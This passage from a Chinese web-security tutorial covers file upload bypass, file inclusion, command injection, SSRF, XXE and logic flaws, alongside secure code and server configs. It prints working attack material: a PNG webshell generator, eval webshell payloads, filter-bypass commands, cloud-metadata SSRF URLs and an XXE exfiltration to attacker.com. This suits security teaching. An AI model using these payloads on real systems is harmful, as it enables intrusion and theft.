| **Nginx** | 路径解析 | `/shell.jpg/shell.php`（配置错误） |
| **Nginx** | 文件名逻辑漏洞 | CVE-2013-4547 |
| **Lighttpd** | 拼接解析 | 类似 Nginx 的路径解析 |

**6. 图片二次渲染绕过**

当服务端对上传的图片进行二次渲染（压缩、缩放、加水印）时，简单的图片马会失效。需要在渲染后仍保留 PHP 代码。

**方法1：PNG IDAT 块注入**
```python
#!/usr/bin/env python3
"""
PNG 图片马生成 - 在 IDAT 块中注入 PHP 代码
利用二次渲染后部分 IDAT 数据不变的特点
"""
import struct
import zlib

def make_png_webshell(outfile, php_code):
    """生成包含 PHP 代码的 PNG 图片"""
    # PNG 文件头
    signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR 块 (13 字节)
    width, height = 100, 100
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
    ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
    
    # IDAT 块 - 构造包含 PHP 代码的像素数据
    raw_data = b''
    for y in range(height):
        raw_data += b'\x00'  # 过滤字节
        # 每行 100 像素 * 3 字节 = 300 字节
        # 在某些位置注入 PHP 代码的字节
        row = bytearray([255, 255, 255] * width)
        raw_data += bytes(row)
    
    # 在 IDAT 数据中寻找能解码出 PHP 代码的位置（复杂，略）
    # 简化版：直接在末尾追加 PHP 代码（部分渲染方式会保留）
    compressed = zlib.compress(raw_data)
    idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xffffffff
    idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)
    
    # IEND 块
    iend_crc = zlib.crc32(b'IEND') & 0xffffffff
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    
    png_data = signature + ihdr + idat + iend
    
    # 末尾追加 PHP 代码（配合解析漏洞使用）
    png_data += b'\n<?php ' + php_code.encode() + b' ?>\n'
    
    with open(outfile, 'wb') as f:
        f.write(png_data)
    
    print(f"[+] 图片马已生成: {outfile}")

make_png_webshell('shell.png', "eval(\$_POST['cmd']);")
```

**方法2：GIF 图片马（最稳定）**
```bash
# 方法：在 GIF 注释块中注入 PHP 代码
# 很多二次渲染会保留 GIF 注释

# 使用 gifsicle 等工具
echo "GIF89a" > shell.gif
# 构造合法 GIF + PHP 代码
# 或者用 ImageMagick 添加注释
convert normal.jpg -comment '<?php eval($_POST["x"]);?>' output.jpg
```

**7. 文件上传漏洞检测脚本（Python）**

```python
#!/usr/bin/env python3
"""
文件上传漏洞检测工具（仅用于授权测试）
"""
import requests
import os

class UploadScanner:
    def __init__(self, url, param='file', proxy=None):
        self.url = url
        self.param = param
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None
        self.results = []
    
    def test_upload(self, filename, content, content_type='application/octet-stream'):
        """测试上传"""
        files = {
            self.param: (filename, content, content_type)
        }
        try:
            r = requests.post(self.url, files=files, 
                            proxies=self.proxies, timeout=10, allow_redirects=False)
            return r.status_code, r.text
        except Exception as e:
            return None, str(e)
    
    def check_accessible(self, base_url, filename):
        """检查上传后的文件是否可访问"""
        url = f"{base_url}/{filename}"
        try:
            r = requests.get(url, proxies=self.proxies, timeout=5)
            return r.status_code, r.text
        except:
            return None, None
    
    def run_all_tests(self, upload_base_url):
        """运行所有测试用例"""
        test_cases = [
            # (文件名, 文件内容, Content-Type, 描述)
            ('test.php', '<?php echo "UPLOAD_TEST"; ?>', 'application/x-httpd-php', '直接上传 PHP'),
            ('test.php', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', 'MIME 绕过 - PHP+image/jpeg'),
            ('test.php3', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', '后缀绕过 - .php3'),
            ('test.phtml', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', '后缀绕过 - .phtml'),
            ('test.PHP', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', '大小写绕过 - .PHP'),
            ('test.jpg.php', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', '双后缀绕过 - .jpg.php'),
            ('test.php.jpg', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', 'Apache 解析 - .php.jpg'),
            ('GIF89a_test.php', 'GIF89a<?php echo "UPLOAD_TEST"; ?>', 'image/gif', '文件头绕过 - GIF+PHP'),
            ('test.php%00.jpg', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', '00 截断'),
            ('.htaccess', 'AddType application/x-httpd-php .test\n', 'text/plain', '.htaccess 绕过'),
            ('test.test', '<?php echo "UPLOAD_TEST"; ?>', 'image/jpeg', '.htaccess 配合测试'),
        ]
        
        for filename, content, ctype, desc in test_cases:
            status, resp = self.test_upload(filename, content, ctype)
            if status and status == 200 and '失败' not in resp and '禁止' not in resp:
                # 可能上传成功，尝试访问
                acc_status, acc_resp = self.check_accessible(upload_base_url, filename)
                if acc_status == 200 and 'UPLOAD_TEST' in acc_resp:
                    self.results.append((desc, filename, '成功！代码可执行'))
                    print(f"[+] {desc}: 成功！ {filename}")
                elif acc_status == 200:
                    self.results.append((desc, filename, '文件可访问，但未执行'))
                    print(f"[!] {desc}: 文件可访问 {filename}")
                else:
                    self.results.append((desc, filename, '上传成功但无法访问'))
                    print(f"[*] {desc}: 上传成功 {filename}")
            else:
                print(f"[-] {desc}: 被拦截")
        
        return self.results

# 使用示例
if __name__ == '__main__':
    scanner = UploadScanner(
        url='http://target.com/upload.php',
        param='file'
    )
    results = scanner.run_all_tests('http://target.com/uploads')
    
    print("\n" + "="*50)
    print("测试结果汇总：")
    for desc, filename, status in results:
        print(f"  {status} - {desc} ({filename})")
```

#### 三、防御实现代码

**1. 安全的文件上传类（PHP）**

```php
<?php
/**
 * 安全的文件上传处理类
 */
class SecureUpload {
    
    private $uploadDir = '';
    private $maxSize = 2 * 1024 * 1024;  // 2MB
    private $allowedExt = ['jpg', 'jpeg', 'png', 'gif'];
    private $allowedMime = ['image/jpeg', 'image/png', 'image/gif'];
    
    public function __construct($uploadDir) {
        $this->uploadDir = rtrim($uploadDir, '/') . '/';
        if (!is_dir($this->uploadDir)) {
            mkdir($this->uploadDir, 0755, true);
        }
    }
    
    /**
     * 安全上传
     */
    public function upload($fileField) {
        // 1. 检查是否有上传错误
        if (!isset($_FILES[$fileField]) || $_FILES[$fileField]['error'] !== UPLOAD_ERR_OK) {
            return ['success' => false, 'msg' => '文件上传错误'];
        }
        
        $file = $_FILES[$fileField];
        $tmpName = $file['tmp_name'];
        $origName = $file['name'];
        $fileSize = $file['size'];
        $fileType = $file['type'];
        
        // 2. 检查文件大小
        if ($fileSize > $this->maxSize) {
            return ['success' => false, 'msg' => '文件大小超过限制'];
        }
        
        // 3. 获取真实文件后缀（使用 pathinfo）
        $ext = strtolower(pathinfo($origName, PATHINFO_EXTENSION));
        
        // 4. 白名单校验后缀
        if (!in_array($ext, $this->allowedExt)) {
            return ['success' => false, 'msg' => '不允许的文件类型'];
        }
        
        // 5. 校验 MIME 类型（双重校验）
        if (!in_array($fileType, $this->allowedMime)) {
            return ['success' => false, 'msg' => '文件类型不匹配'];
        }
        
        // 6. 使用 finfo 获取真实 MIME 类型（最可靠）
        $finfo = new Finfo(FILEINFO_MIME_TYPE);
        $realMime = $finfo->file($tmpName);
        if (!in_array($realMime, $this->allowedMime)) {
            return ['success' => false, 'msg' => '文件内容不匹配'];
        }
        
        // 7. 使用 getimagesize 二次确认是图片
        if (!$imageInfo = @getimagesize($tmpName)) {
            return ['success' => false, 'msg' => '不是有效的图片文件'];
        }
        
        // 8. 生成随机文件名（防止路径遍历、重名覆盖）
        $newFileName = uniqid() . '_' . bin2hex(random_bytes(8)) . '.' . $ext;
        $destPath = $this->uploadDir . $newFileName;
        
        // 9. 使用 move_uploaded_file（安全函数，只处理 HTTP 上传的文件）
        if (!move_uploaded_file($tmpName, $destPath)) {
            return ['success' => false, 'msg' => '文件保存失败'];
        }
        
        // 10. 设置文件权限（不可执行）
        chmod($destPath, 0644);
        
        // 11. 可选：二次渲染图片（彻底清除代码）
        // $this->recompressImage($destPath, $ext);
        
        return [
            'success' => true,
            'msg' => '上传成功',
            'filename' => $newFileName,
            'path' => $destPath,
            'size' => $fileSize
        ];
    }
    
    /**
     * 图片二次渲染（压缩重绘，彻底清除嵌入的代码）
     */
    private function recompressImage($filePath, $ext) {
        switch ($ext) {
            case 'jpg':
            case 'jpeg':
                $img = imagecreatefromjpeg($filePath);
                if ($img) {
                    imagejpeg($img, $filePath, 75);  // 75% 质量
                    imagedestroy($img);
                }
                break;
            case 'png':
                $img = imagecreatefrompng($filePath);
                if ($img) {
                    imagepng($img, $filePath, 6);
                    imagedestroy($img);
                }
                break;
            case 'gif':
                $img = imagecreatefromgif($filePath);
                if ($img) {
                    imagegif($img, $filePath);
                    imagedestroy($img);
                }
                break;
        }
    }
}

// 使用示例
$uploader = new SecureUpload('/var/www/uploads/');
$result = $uploader->upload('file');
if ($result['success']) {
    echo "上传成功：" . $result['filename'];
} else {
    echo "上传失败：" . $result['msg'];
}
?>
```

**2. Nginx 安全配置**

```nginx
# 文件上传目录禁止执行 PHP
location ~* ^/uploads/.*\.php$ {
    deny all;
    return 403;
}

# 或更严格：上传目录只允许静态文件
location ^~ /uploads/ {
    expires 30d;
    # 禁止解析任何脚本
    location ~ \.(php|php5|phtml|pl|py|jsp|asp|sh)$ {
        deny all;
    }
}

# 限制上传文件大小
client_max_body_size 10m;

# 正确的 PHP 解析配置（避免路径解析漏洞）
location ~ \.php$ {
    # 使用 try_files 防止 Nginx 文件类型解析漏洞
    try_files $uri =404;
    fastcgi_pass unix:/var/run/php-fpm.sock;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
    
    # 限制 PHP 可执行目录
    # fastcgi_param PHP_VALUE open_basedir=/var/www/html/:/tmp/;
}
```

**3. Apache 安全配置**

```apache
# 文件上传目录禁止执行脚本
<Directory "/var/www/html/uploads">
    php_flag engine off
    AddType text/plain .php .php5 .phtml .pl .py
    Options -ExecCGI
    AllowOverride None  # 禁止 .htaccess
    Require all granted
</Directory>

# 禁止访问特定文件
<FilesMatch "\.(php|phar|phtml|inc)$">
    Require all denied
</FilesMatch>

# 限制上传大小
LimitRequestBody 10485760
```

---

## 第六章：文件包含漏洞

### 6.1 漏洞原理

当应用程序使用文件包含函数（如 PHP 的 include、require），且包含的文件路径用户可控时，攻击者可以通过修改路径包含恶意文件，执行任意代码。

### 6.2 分类

| 类型 | 说明 |
|------|------|
| **LFI 本地文件包含** | 包含服务器本地文件 |
| **RFI 远程文件包含** | 包含远程 URL 文件（需 allow_url_include=On） |

### 6.3 本地文件包含（LFI）

**漏洞代码**：
```php
<?php
$page = $_GET['page'];
include($page . '.php');
?>
```

**利用**：
```
?page=../../../../etc/passwd       # 读取系统文件
?page=../../../../windows/win.ini  # Windows
```

**PHP 伪协议利用**：
```
# 读取源码（Base64 编码）
?page=php://filter/read=convert.base64-encode/resource=config

# 执行 PHP 代码（php://input）
?page=php://input
POST 数据: <?php system('whoami');?>

# 读取文件（php://filter）
?page=file:///etc/passwd

# 压缩流
?page=php://filter/zlib.deflate/convert.base64-encode/resource=index
```

**包含日志文件 GetShell**：
```
1. 访问 URL 注入 PHP 代码到日志
   /<?php eval($_POST[cmd]);?>
   (User-Agent 中也可以注入)

2. 包含日志文件
   ?page=../../../../var/log/apache2/access.log
   ?page=../../../../var/log/nginx/access.log
```

**包含 session 文件**：
```
?page=../../../../tmp/sess_sessionid
```

### 6.4 远程文件包含（RFI）

**条件**：`allow_url_include = On`（PHP 配置）

**漏洞代码**：
```php
<?php
$page = $_GET['page'];
include($page);
?>
```

**利用**：
```
?page=http://attacker.com/shell.txt
```
远程文件内容为 `<?php eval($_POST['cmd']);?>`，执行后获得 Webshell。

### 6.5 防护方法

1. **白名单限制**：只允许包含指定文件
2. **禁用远程包含**：`allow_url_include = Off`
3. **路径限制**：`open_basedir` 限制可访问目录
4. **硬编码包含路径**：不要让用户控制包含路径
5. **输入过滤**：过滤 `..`、`/`、`\` 等特殊字符

---

## 第七章：命令注入

### 7.1 漏洞原理

应用程序调用系统命令时，用户输入被拼接到命令中执行，导致攻击者可以注入恶意命令。

### 7.2 危险函数

**PHP**：
```php
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
反引号 ``
```

**Python**：
```python
os.system()
os.popen()
subprocess.call(shell=True)
```

**Java**：
```java
Runtime.getRuntime().exec()
ProcessBuilder
```

### 7.3 漏洞示例

**漏洞代码**：
```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**利用**：
```
?ip=127.0.0.1; whoami
?ip=127.0.0.1 | whoami
?ip=127.0.0.1 && whoami
?ip=127.0.0.1 || whoami
```

### 7.4 命令连接符

| 符号 | 说明 |
|------|------|
| `;` | 顺序执行，前面执行完执行后面 |
| `&&` | 前面成功才执行后面 |
| `||` | 前面失败才执行后面 |
| `|` | 管道符，前面输出作为后面输入 |
| `&` | 后台执行 |
| `$()` | 命令替换 |
| `` ` `` | 反引号，命令替换 |
| `\n` | 换行执行 |

### 7.5 绕过技巧

**空格过滤**：
```
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

**关键字过滤**：
```
# 拼接
a=ca;b=t;$a$b /etc/passwd

# 编码
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# 反斜杠绕过
c\at /e\tc/passwd

# 通配符
cat /etc/pa??wd
cat /etc/pass*
```

**Windows 特殊**：
```
ipconfig&whoami
ipconfig&&whoami
ipconfig|whoami
%0a 换行
```

### 7.6 防护方法

1. **尽量不用系统命令**：用语言内置函数替代
2. **使用参数数组**：避免 shell 解析
   ```python
   subprocess.run(['ping', '-c', '4', ip], shell=False)  # 安全
   subprocess.run(f"ping -c 4 {ip}", shell=True)         # 危险
   ```
3. **输入白名单校验**：只允许合法字符
4. **转义特殊字符**：
   - PHP: `escapeshellarg()`、`escapeshellcmd()`
   - Python: `shlex.quote()`

---

## 第八章：代码执行

### 8.1 漏洞原理

应用程序将用户输入作为代码执行，导致攻击者可以执行任意代码。

### 8.2 常见危险函数

**PHP**：
```php
eval()
assert()
preg_replace() /e 修饰符
create_function()
call_user_func()
array_map()
usort()
```

**Python**：
```python
eval()
exec()
pickle.loads()  # 反序列化
yaml.load()     # 不安全加载
```

**Java**：
```java
Runtime.getRuntime().exec()
ScriptEngine eval
JNI 调用
```

### 8.3 漏洞示例

**PHP eval()**：
```php
<?php
$str = $_GET['str'];
eval("\$str = \"$str\";");
?>
```
利用：`?str=${phpinfo()}` 或 `?str={${phpinfo()}}`

**PHP assert()**：
```php
<?php
assert($_GET['code']);
?>
```
利用：`?code=phpinfo()`

**Python eval()**：
```python
code = input("输入表达式: ")
result = eval(code)  # 危险！
```
利用：`__import__('os').system('whoami')`

### 8.4 防护方法

1. **避免使用危险函数**：用安全的替代方案
2. **不要将用户输入传入 eval/exec**
3. **沙箱隔离**：如必须执行，在沙箱中运行
4. **输入严格过滤**：白名单校验

---

## 第九章：SSRF 服务端请求伪造

### 9.1 漏洞原理

SSRF（Server-Side Request Forgery）攻击者诱导服务端发起请求，访问或攻击内网资源。服务端作为代理，可以访问内网、本地服务、云服务元数据等。

### 9.2 常见触发点

- 图片加载/下载：`?img_url=http://...`
- 在线预览/抓取
- 第三方 API 调用
- 文件处理（XML 解析中也可能有）
- 分享功能
- 订阅功能（RSS）

### 9.3 利用方式

**探测内网**：
```
?url=http://127.0.0.1:3306    # 探测 MySQL
?url=http://192.168.1.1:80    # 内网 Web
?url=http://10.0.0.1:22       # 内网 SSH
```

**访问本地敏感文件**（部分场景）：
```
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
```

**云服务元数据**（AWS）：
```
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**利用 Gopher 协议**：
```
?url=gopher://127.0.0.1:3306/_...
# 构造 MySQL 请求、Redis 请求等
```

**攻击内网 Redis**：
```
?url=dict://127.0.0.1:6379/info
```

### 9.4 绕过方式

**IP 地址绕过**：
```
# 十进制
http://2130706433/   = 127.0.0.1

# 八进制
http://0177.0.0.1/

# 十六进制
http://0x7f000001/

# 短地址
http://127.1
http://127.0.1
http://0  (=0.0.0.0)

# DNS 解析
http://localhost
http://0.0.0.0
```

**URL 解析差异**：
```
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://attacker.com\127.0.0.1
```

**协议绕过**：
```
file:///
dict://
gopher://
ftp://
http://
https://
```

### 9.5 防护方法

1. **白名单限制**：只允许指定的域名或协议
2. **禁止访问内网**：解析域名后检查 IP 是否为内网地址
3. **禁用危险协议**：只允许 http/https，禁用 file/gopher/dict
4. **统一错误信息**：不泄露端口、协议等信息
5. **限制请求方法**：只允许 GET，禁止其他方法
6. **使用独立网络环境**：云环境使用独立实例

---

## 第十章：XXE XML 外部实体注入

### 10.1 漏洞原理

XML 解析器在解析 XML 时，允许引用外部实体（External Entity），攻击者可以构造恶意 XML 读取敏感文件、执行命令、发起 SSRF 等。

### 10.2 漏洞示例

**读取本地文件**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**SSRF**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
]>
<foo>&xxe;</foo>
```

**Blind XXE（OOB 外带）**：
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

evil.dtd：
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 10.3 PHP 中的 XXE

```php
// 危险：LIBXML_NOENT 开启外部实体
$xml = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

### 10.4 防护方法

1. **禁用外部实体**：
   - PHP: `libxml_disable_entity_loader(true);`
   - Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - Python: `defusedxml` 库
2. **使用 JSON 替代 XML**
3. **更新 XML 解析库**

---

## 第十一章：逻辑漏洞

### 11.1 概述

逻辑漏洞是业务流程设计缺陷导致的安全问题，不是技术层面的漏洞，而是逻辑层面的漏洞。

### 11.2 常见逻辑漏洞

#### 越权访问

**水平越权**：A 用户访问 B 用户的数据（同一权限级别）
```
/user/info?id=1  →  修改 id=2 查看其他用户信息
```

**垂直越权**：普通用户访问管理员功能
```
普通用户直接访问 /admin/user_list 页面
```

**防护**：每次操作都校验用户权限，不仅靠前端隐藏。

#### 支付逻辑漏洞

- 修改价格：抓包改商品价格
- 修改数量：负数数量、0 元购买
- 修改订单状态：直接改状态为"已支付"
- 优惠券复用：同一张优惠券多次使用
- 并发竞争：利用并发条件重复扣减

**防护**：
- 服务端重新计算价格，不相信客户端
- 数据库事务 + 乐观锁/悲观锁
- 幂等性设计

#### 密码找回漏洞

- 验证码暴力破解
- 验证码回显在响应包中
- 修改用户 ID 重置他人密码
- 重置 Token 可预测
- 弱密保问题

#### 注册与登录逻辑

- 注册时用户名空格、特殊字符
- 短信验证码无次数限制
- 会话固定攻击
- 密码明文传输/存储

---

## 第十二章：其他常见漏洞

### 12.1 反序列化漏洞

**原理**：应用程序将用户可控的数据反序列化，触发恶意构造的对象中的魔术方法，导致代码执行。

**PHP 反序列化**：
```php
// 危险代码
$data = unserialize($_GET['data']);

// 利用：构造恶意对象，触发 __destruct()、__wakeup() 等魔术方法
```

**Java 反序列化**：
- Commons Collections 漏洞
- Fastjson 漏洞
- Jackson 漏洞
- Shiro 反序列化

### 12.2 目录遍历

**原理**：应用程序允许用户控制文件路径，但未正确过滤 `../` 等路径穿越字符。

```
/download?file=../../../../etc/passwd
/view?path=..\..\..\windows\win.ini
```

### 12.3 信息泄露

- 目录浏览（目录索引）
- 错误信息泄露（数据库错误、路径泄露）
- 备份文件泄露（.bak、.swp、.git、.svn）
- 源码泄露（.php~、.phps、.bak）
- 配置文件泄露
- 版本信息泄露（Server 头、X-Powered-By）
- API 文档泄露

### 12.4 弱口令与暴力破解

- 后台弱密码（admin/admin、admin/123456）
- 无登录次数限制
- 无验证码或验证码可绕过
- 用户名枚举（不同错误提示）

### 12.5 CORS 配置错误

**原理**：跨域资源共享配置不当，允许任意域名读取敏感数据。

**危险配置**：
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**利用**：攻击者网站通过 AJAX 跨域读取用户数据。

### 12.6 点击劫持

**原理**：通过透明 iframe 覆盖在正常页面上，诱导用户点击。

**防护**：
- `X-Frame-Options: DENY / SAMEORIGIN`
- CSP `frame-ancestors`

---

## 漏洞示例代码

详见 `vulnerabilities/` 目录中的示例代码：
- `xss/` — XSS 漏洞示例（反射型、存储型、DOM 型）
- `csrf/` — CSRF 漏洞示例
- `upload/` — 文件上传漏洞示例
- `sqli/` — SQL 注入漏洞示例

> ⚠️ **安全提示**：本文档仅用于安全学习和授权测试，禁止用于任何非法用途。使用漏洞技术攻击未授权的系统属于违法行为。

> **延伸学习**：掌握核心漏洞原理后，可进一步学习各漏洞的高级利用技巧、绕过 WAF、漏洞挖掘思路、靶场实战（DVWA、Pikachu、Upload-labs、SQLi-labs 等）。
